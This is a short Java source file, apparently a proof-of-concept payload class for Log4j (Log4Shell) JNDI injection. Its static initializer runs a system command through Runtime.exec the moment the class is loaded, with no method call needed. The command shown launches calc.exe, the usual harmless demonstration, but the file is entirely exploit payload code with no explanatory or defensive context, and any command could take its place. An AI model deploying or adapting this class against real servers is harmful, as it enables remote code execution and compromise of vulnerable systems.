public class Log4J {
    static {
        try {
            String cmd = "calc.exe";
            Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}